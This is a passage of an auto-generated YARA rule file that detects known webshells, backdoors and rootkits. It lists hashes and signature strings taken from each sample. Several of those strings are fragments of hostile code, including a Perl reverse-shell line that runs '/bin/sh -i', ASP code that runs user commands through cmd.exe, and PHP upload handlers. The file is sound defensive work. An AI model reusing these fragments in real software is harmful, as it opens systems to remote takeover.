		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"
	condition:
		all of them
}
rule FSO_s_sincap {
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
	condition:
		all of them
}
rule PhpShell {
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
	condition:
		all of them
}
rule HYTop_DevPack_config {
	meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b41d0e64e64a685178a3155195921d61"
	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="
	condition:
		all of them
}
rule sendmail {
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
	condition:
		all of them
}
rule FSO_s_zehir4 {
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5b496a61363d304532bcf52ee21f5d55"
	strings:
		$s5 = " byMesaj "
	condition:
		all of them
}
rule hkshell_hkshell {
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "168cab58cee59dc4706b3be988312580"
	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"
	condition:
		all of them
}
rule iMHaPFtp {
	meta:
		description = "Webshells Auto-generated - file iMHaPFtp.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "12911b73bc6a5d313b494102abcf5c57"
	strings:
		$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
	condition:
		all of them
}
rule Unpack_TBack {
	meta:
		description = "Webshells Auto-generated - file TBack.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a9d1007823bf96fb163ab38726b48464"
	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"
	condition:
		all of them
}
rule DarkSpy105 {
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
	condition:
		all of them
}
rule EditServer_Webshell {
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"
	condition:
		all of them
}
rule FSO_s_reader {
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
	strings:
		$s2 = "mailto:mailbomb@hotmail."
	condition:
		all of them
}
rule ASP_CmdAsp {
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"
	condition:
		all of them
}
rule KA_uShell {
	meta:
		description = "Webshells Auto-generated - file KA_uShell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "685f5d4f7f6751eaefc2695071569aab"
	strings:
		$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
		$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
	condition:
		all of them
}
rule PHP_Backdoor_v1 {
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "0506ba90759d11d78befd21cabf41f3d"
	strings:

		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
	condition:
		all of them
}
rule svchostdll {
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"
	condition:
		all of them
}
rule HYTop_DevPack_server {
	meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1d38526a215df13c7373da4635541b43"
	strings:
		$s0 = "<!-- PageServer Below -->"
	condition:
		all of them
}
rule vanquish {
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "684450adde37a93e8bb362994efc898c"
	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
	condition:
		all of them
}
rule winshell {
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3144410a37dd4c29d004a814a294ea26"
	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"
	condition:
		all of them
}
rule FSO_s_remview {
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b4a09911a5b23e00b55abe546ded691c"
	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
	condition:
		all of them
}
rule saphpshell {
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d7bba8def713512ddda14baf9cd6889a"
	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
	condition:
		all of them
}
rule HYTop2006_malware_rar_Folder_2006Z {
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "fd1b6129abd4ab177fed135e3b665488"
	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
	condition:
		all of them
}
rule admin_ad {
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
	condition:
		all of them
}
rule FSO_s_casus15 {
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8d155b4239d922367af5d0a1b89533a3"
	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
	condition:
		all of them
}
rule BIN_Client {
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"
	condition:
		4 of them
}
rule shelltools_g0t_root_uptime {
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"
	condition:
		all of them
}
rule Simple_PHP_BackDooR {
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a401132363eecc3a1040774bec9cb24f"
	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"
	condition:
		1 of them
}
rule sig_2005Gray {
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
	condition:
		all of them
}
rule DllInjection {
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
	strings:
		$s0 = "\\BDoor\\DllInjecti"
	condition:
		all of them
}
rule Mithril_v1_45_Mithril {
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."
	condition:
		all of them
}
rule hkshell_hkrmv {
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"
	condition:
		all of them
}
rule phpshell {
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
	condition:
		all of them
}
rule FSO_s_cmd {
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_phpft {
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "60ef80175fcc6a879ca57c54226646b1"
	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"
	condition:
		all of them
}
rule FSO_s_indexer {
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "135fc50f85228691b401848caef3be9e"
	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
	condition:
		all of them
}
rule r57shell {
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8023394542cddf8aee5dec6072ed02b5"
	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
	condition:
		all of them
}
rule bdcli100 {
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "
	condition:
		all of them
}
rule HYTop_DevPack_2005Red {
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
	condition:
		all of them
}
rule HYTop2006_malware_rar_Folder_2006X2 {
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
	condition:
		all of them
}
rule rdrbs084 {
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "ed30327b255816bdd7590bf891aa0020"
	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
	condition:
		all of them
}
rule HYTop_CaseSwitch_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"
	condition:
		all of them
}
rule eBayId_index3 {
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
	condition:
		all of them
}
rule FSO_s_phvayv {
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "205ecda66c443083403efb1e5c7f7878"
	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
	condition:
		all of them
}
rule byshell063_ntboot {
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"
	condition:
		all of them
}
rule FSO_s_casus15_2 {
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8d155b4239d922367af5d0a1b89533a3"
	strings:
		$s0 = "copy ( $dosya_gonder"
	condition:
		all of them
}
rule installer {
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"
	condition:
		all of them
}
rule uploader {
	meta:
		description = "Webshells Auto-generated - file uploader.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b9a9aab319964351b46bd5fc9d6246a8"
	strings:
		$s0 = "move_uploaded_file($userfile, \"entrika.php\"); "
	condition:
		all of them
}
rule FSO_s_remview_2 {
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b4a09911a5b23e00b55abe546ded691c"
	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_r57 {
	meta:
		description = "Webshells Auto-generated - file r57.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "903908b77a266b855262cdbce81c3f72"
	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
	condition:
		all of them
}
rule HYTop2006_malware_rar_Folder_2006X {
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
	condition:
		all of them
}
rule FSO_s_phvayv_2 {
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "205ecda66c443083403efb1e5c7f7878"
	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
	condition:
		all of them
}
rule elmaliseker {
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("
	condition:
		all of them
}
rule shelltools_g0t_root_resolve {
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "69bf9aa296238610a0e05f99b5540297"
	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"
	condition:
		all of them
}
rule FSO_s_RemExp {
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b69670ecdbb40012c73686cd22696eeb"
	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
	condition:
		all of them
}
rule FSO_s_tool {
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_2005 {
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
	condition:
		all of them
}
rule byloader {
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "0f0d6dc26055653f5844ded906ce52df"
	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"
	condition:
		all of them
}
rule shelltools_g0t_root_Fport {
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."
	condition:
		all of them
}
rule BackDooR__fr_ {
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
	condition:
		all of them
}
rule FSO_s_ntdaddy {
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
	condition:
		all of them
}
rule nstview_nstview {
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3871888a0c1ac4270104918231029a56"
	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
	condition:
		all of them
}
rule HYTop_DevPack_upload {
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b09852bda534627949f0259828c967de"
	strings:
		$s0 = "<!-- PageUpload Below -->"
	condition:
		all of them
}
rule PasswordReminder {
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
	condition:
		all of them
}
rule Pack_InjectT {
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"
	condition:
		all of them
}
rule FSO_s_RemExp_2 {
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b69670ecdbb40012c73686cd22696eeb"
	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
	condition:
		all of them
}
rule FSO_s_c99 {
	meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
	condition:
		all of them
}
rule rknt_zip_Folder_RkNT {
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5f97386dfde148942b7584aeb6512b85"
	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"
	condition:
		all of them
}
rule dbgntboot {
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"
	condition:
		all of them
}
rule PHP_shell {
	meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
	condition:
		all of them
}
rule hxdef100 {
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
	condition:
		all of them
}
rule rdrbs100 {
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "7c752bcd6da796d80a6830c61a632bff"
	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "
	condition:
		all of them
}
rule Mithril_Mithril {
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "017191562d72ab0ca551eb89256650bd"
	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"
	condition:
		all of them
}
rule hxdef100_2 {
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
	condition:
		all of them
}
rule Release_dllTest {
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "76a59fc3242a2819307bb9d593bef2e0"
	strings:
		$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
		$s1 = "0 0&00060K0R0X0f0l0q0w0"
		$s2 = ": :$:(:,:0:4:8:D:`=d="
		$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
		$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
		$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
		$s6 = "0)0O0\\0a0o0\"1E1P1q1"
		$s7 = "<.<I<d<h<l<p<t<x<|<"
		$s8 = "3&31383>3F3Q3X3`3f3w3|3"
		$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
	condition:
		all of them
}
rule webadmin {
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3a90de401b30e5b590362ba2dde30937"
	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
	condition:
		all of them
}
rule commands {
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
